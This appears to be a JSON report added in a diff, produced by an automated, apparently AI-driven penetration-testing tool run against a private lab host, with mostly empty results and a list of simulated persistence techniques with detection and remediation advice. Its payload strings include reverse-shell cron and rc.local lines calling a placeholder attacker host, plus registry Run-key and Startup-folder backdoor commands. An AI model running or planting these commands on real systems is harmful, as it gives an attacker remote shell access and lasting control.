@@ -1,0 +1,81 @@
+{
+  "target": "192.168.56.102",
+  "recon": {
+    "dns": {
+      "A": [],
+      "MX": [],
+      "NS": [],
+      "TXT": []
+    },
+    "whois": {
+      "registrar": null,
+      "creation_date": null,
+      "expiration_date": null,
+      "emails": null,
+      "org": null
+    },
+    "subdomains": [],
+    "shodan": {},
+    "timestamp": "2026-02-21T18:33:32.583140"
+  },
+  "scan_results": {},
+  "ai_decisions": [],
+  "exploit_results": [],
+  "privesc_results": {
+    "message": "No SSH session available. Privesc checks require a valid session.",
+    "suid_binaries": [],
+    "sudo_misconfig": [],
+    "cron_jobs": [],
+    "writable_configs": []
+  },
+  "persistence_simulated": [
+    {
+      "technique": "Cron Job Persistence",
+      "mitre_id": "T1053.003",
+      "simulated": true,
+      "payload_string": "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+      "target_file": "/etc/crontab",
+      "detection": "Monitor /etc/crontab for unauthorized modifications",
+      "remediation": "Audit cron jobs weekly. Use cron.allow/deny restrictions.",
+      "timestamp": "2026-02-21T13:03:35.176459"
+    },
+    {
+      "technique": "RC.local Startup Script",
+      "mitre_id": "T1037.004",
+      "simulated": true,
+      "payload_string": "#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\nexit 0",
+      "target_file": "/etc/rc.local",
+      "detection": "Monitor /etc/rc.local for unauthorized changes; check file integrity with AIDE/Tripwire.",
+      "remediation": "Disable rc.local execution or restrict write access. Use systemd service hardening.",
+      "timestamp": "2026-02-21T13:03:35.176473"
+    },
+    {
+      "technique": "Registry Run Key",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"cmd.exe\"",
+      "target_file": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "detection": "Monitor registry Run/RunOnce keys for new or modified values using Sysmon (Event ID 13).",
+      "remediation": "Restrict registry write access. Deploy endpoint detection (EDR) with Run-key monitoring.",
+      "timestamp": "2026-02-21T13:03:35.176475"
+    },
+    {
+      "technique": "Startup Folder",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "copy backdoor.exe \"C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"",
+      "target_file": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "detection": "Monitor Startup folder contents for new executables; use Autoruns for auditing.",
+      "remediation": "Restrict write access to Startup folders. Use AppLocker / WDAC to block unsigned executables.",
+      "timestamp": "2026-02-21T13:03:35.176477"
+    }
+  ],
+  "session_info": {
+    "host": "192.168.56.102",
+    "port": 21,
+    "username": "anonymous",
+    "password": "",
+    "technique": "ftp_anon"
+  },
+  "report_generated": "2026-02-21T18:33:38.951558"
+}
